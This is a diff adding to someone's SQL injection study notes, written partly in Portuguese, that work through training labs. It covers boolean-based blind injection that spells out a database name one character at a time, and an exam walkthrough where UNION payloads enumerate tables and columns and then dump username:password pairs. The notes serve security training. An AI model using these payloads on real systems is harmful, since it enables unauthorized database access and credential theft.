@@ -251,3 +251,99 @@ List columns from the users table ->
 
 Extract data from users ->
 : ' UNION SELECT 1, group_concat(username, ':', password), 3, 4 FROM users #
+
+* Boolean_based BLind SQL injection
+This lab contains is a SQL Injection vulnerability in the stock control function. Due to the business logic, only "available in stock" or "not available in stock" response is received from the server.
+
+To complete the lab, perform a Blind SQL Injection attack using these two possibilities and retrieve the database name.
+
+What is database name?
+
+*KEy steps fro boolen based* ->
+1. Identifying the entry point ->
+   This type of attack is typically directed at queries that directly take user input. First, the target entry point must be identified, such as username or search fields.
+
+2. Logical response evaluation ->
+   The attacker manipulates the query to determine information about the database’s structure and content based on the logical outcomes of the query.
+
+3. Manipulating with logical operators ->
+   In these attacks, queries are manipulated using logical operators (AND, OR) and True/False conditions. For example:
+
+Esse payload funcionou e informou que o nome possui exatamente 10 chars
+: applewatch7' AND LENGTH(database()) = 10;
+
+A primeira letra é ~e~, este payload confirmou ->
+: applewatch7' AND SUBSTRING(database(), 1, 1) = 'e';
+
+*search* ->
+: applewatch7' AND SUBSTRING(database(), 2, 1) > 'a';
+
+Deu verdadeiro, entao a segunda letra está entre a e d, pois d deu false
+
+Segunda letra é igual a ~c~ ->
+: applewatch7' AND SUBSTRING(database(), 2, 1) = 'c';
+
+Terceira letra é ~h~ ->
+: applewatch7' AND SUBSTRING(database(), 3, 1) = 'h';
+
+Quarta letra é ~o~ ->
+: applewatch7' AND SUBSTRING(database(), 4, 1) = 'o';
+
+QUinta letra é ~0 zero~ ->
+: applewatch7' AND SUBSTRING(database(), 5, 1) = 0;
+
+Sexta letra é ~s~ ->
+: applewatch7' AND SUBSTRING(database(), 6, 1) = 's';
+
+Sétima letra é ~t~ ->
+: applewatch7' AND SUBSTRING(database(), 7, 1) = 't';
+
+Oitava letra é ~o~ ->
+: applewatch7' AND SUBSTRING(database(), 8, 1) = 'o';
+
+Nona letra é ~r~ ->
+: applewatch7' AND SUBSTRING(database(), 9, 1) = 'r';
+
+Décima letra é ~e~ ->
+: applewatch7' AND SUBSTRING(database(), 10, 1) = 'e';
+
+* EXAM machine
+
+this payload works so far ->
+: he' OR 1=1;#
+
+Ordening with ORDER to identify the number of columns ->
+: he' ORDER BY 1;#
+: he' ORDER BY 2;#
+: he' ORDER BY 3;#
+
+Crafting the UNION payload ->
+: he' UNION SELECT 1,DATABASE(),3;#
+
+This return the database name ->
+: Vega_dictionary
+
+Get information from ->
+: he' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='Vega_dictionary';#
+
+Users,words
+
+Get then ->
+: he' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema='Vega_dictionary';#
+
+Email,full_name,id,last_name,password,username,id,meaning,word
+
+Get Users table ->
+: he' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema='Vega_dictionary' AND table_name='Users';#
+
+Email,full_name,id,last_name,password,username
+
+Com estas infos, pode se retornar a payloads mais simples porém focados e com mais precisão, neste caso focando na tabela users e suas colunas ->
+: he' UNION SELECT 1,GROUP_CONCAT(username, ':', password),3 FROM Users;#
+
+* time-based blind SQL injection
+This lab contains is a SQL Injection vulnerability in the forgot password function. Unlike other SQL Injection labs, the answer returned from the server is always the same.
+
+To complete the lab, perform a Time-Based Blind SQL Injection attack observing the changes in response time and retrieve the database name.
+
+What is database name?
